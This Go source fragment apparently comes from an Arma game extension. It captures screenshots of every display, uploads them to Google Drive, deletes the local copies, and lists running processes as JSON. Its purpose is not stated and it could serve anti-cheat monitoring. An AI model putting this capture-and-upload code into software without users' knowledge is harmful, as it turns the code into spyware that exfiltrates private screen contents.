package main

/*
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
*/
import "C"

import (
	"encoding/json"
	"fmt"
	"image"
	"time"
	"unsafe"

	"github.com/kbinani/screenshot"
	"github.com/mitchellh/go-ps"

	"bytes"
	"image/png"
	"io/ioutil"
	"os"

	"google.golang.org/api/drive/v3"
)

func makeScreenshot(basePath string) {
	n := screenshot.NumActiveDisplays()

	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)

		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			fmt.Println(err)
			break
		}
		t := time.Now()
		name := fmt.Sprintf("Screen%d_%d_%d_%d.png", i, t.Hour(), t.Minute(), t.Second())
		uploadScrennshot(basePath, name, img)
	}
}

func uploadScrennshot(basepath string, name string, img *image.RGBA) {
	dir := checkPath(basepath)
	srv := getSrv()

	filename := fmt.Sprintf("%s/%s", os.TempDir(), name)
	fmt.Println(filename)
	imgW, err := os.Create(filename)
	if err != nil {
		fmt.Println(err)
	}
	defer imgW.Close()
	defer os.Remove(filename)

	png.Encode(imgW, img)
	_img, err := ioutil.ReadFile(filename)
	if err != nil {
		fmt.Println(err)
	}

	imgR := bytes.NewReader(_img)

	_, err = srv.Files.Create(&drive.File{
		Name:    name,
		Parents: []string{dir},
	}).Media(imgR).Do()
	if err != nil {
		fmt.Println(err.Error())
	}
}

func printInArma(output *C.char, outputsize C.size_t, input string) {
	result := C.CString(input)
	defer C.free(unsafe.Pointer(result))
	var size = C.strlen(result) + 1
	if size > outputsize {
		size = outputsize
	}
	C.memmove(unsafe.Pointer(output), unsafe.Pointer(result), size)
}

func getProcesses() string {
	procs, err := ps.Processes()
	if err != nil {
		returnMyData("errors", err)
	}

	result := make(map[string]struct{})
	for _, proc := range procs {
		name := proc.Executable()
		if _, ok := result[name]; !ok {
			result[name] = struct{}{}
		}
	}
	names := []string{}
	for key := range result {
		names = append(names, key)
	}
	return fmt.Sprintf("%v\n", struct2JSON(names))
}

func struct2JSON(v interface{}) string {
	b, _ := json.Marshal(v)
	return string(b)
}
